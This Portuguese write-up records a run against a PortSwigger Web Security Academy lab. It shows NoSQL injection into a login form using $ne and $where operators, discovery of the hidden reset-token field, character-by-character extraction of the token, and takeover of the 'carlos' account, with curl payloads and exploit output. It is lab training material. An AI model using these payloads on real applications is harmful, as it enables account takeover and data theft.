# Execução contra o lab ao vivo (PortSwigger)

Alvo: `https://0a6200ca04a1f6c581905c8300630014.web-security-academy.net`
(status: **Solved** ao final desta execução)

> O token de reset de `carlos` é **efêmero**: a instância é reiniciada/expira e o token muda.
> Os valores abaixo são registrados apenas como evidência do processo; **não** são credenciais
> reutilizáveis.

## 1. Verificação inicial do oráculo

O lab responde HTTP 200 com as mensagens abaixo (o texto exato difere ligeiramente do nosso
reimplemento, mas o marcador `Account locked` é comum):

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":"invalid"}' "$LAB/login"
# -> <p class=is-warning>Invalid username or password</p>

curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"}}' "$LAB/login"
# -> <p class=is-warning>Account locked: please reset your password</p>
```

`$where` confirmado:

```bash
... -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}'    # -> Invalid...
... -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}'    # -> Account locked
```

## 2. Descoberta do campo e exfiltração do token

Execução do mesmo exploit usado na reimplementação:

```bash
python3 exploit/exploit.py \
  --target https://0a6200ca04a1f6c581905c8300630014.web-security-academy.net \
  --workers 32 --debug
```

Trechos observados:

```
[*] 2. Disparando reset de senha do carlos (cria o campo do token) ...
[*] 3. Descobrindo nomes de campos (Object.keys) ...
    campos descobertos: ['_id', 'username', 'password', 'email', 'passwordReset']
[*] 4. Identificando campo do token de reset ...
    campo do token: passwordReset
[*] 5. Exfiltrando valor do token (por prefixo) ...
    token: 1a2d32f87b389f6a          # efêmero (execuções anteriores: 8badd1436a2cc4bb)
[*] 6. Redefinindo senha de carlos ...
    [debug] form action='' inputs=['csrf', 'passwordReset', 'new-password-1', 'new-password-2']
[*] 7. Logando como carlos ...
[+] SUCESSO: logado como carlos. URL final:
    https://0a6200ca04a1f6c581905c8300630014.web-security-academy.net/my-account?id=carlos
```

Notas de fidelidade observadas no alvo real:

- O **nome do campo** encontrado foi `passwordReset` (aqui coincide com o da reimplementação; no
  lab ele é imprevisível por instância — a descoberta é sempre dinâmica).
- O **token** tem 16 caracteres hex.
- O formulário de troca de senha usa `action` vazio (POST na própria URL, com a query do token) e
  os campos `csrf`, `passwordReset`, `new-password-1`, `new-password-2`.
- O campo do token **só surge após** o `POST /forgot-password` com `username=carlos`.

## 3. Confirmação do solve

```bash
curl -s "$LAB/" | grep -oE "widgetcontainer-lab-status[^>]*>|<p>(Not )?[Ss]olved</p>" | head
# -> widgetcontainer-lab-status is-solved'>
# -> <p>Solved</p>
```

Banner final: **Solved**.
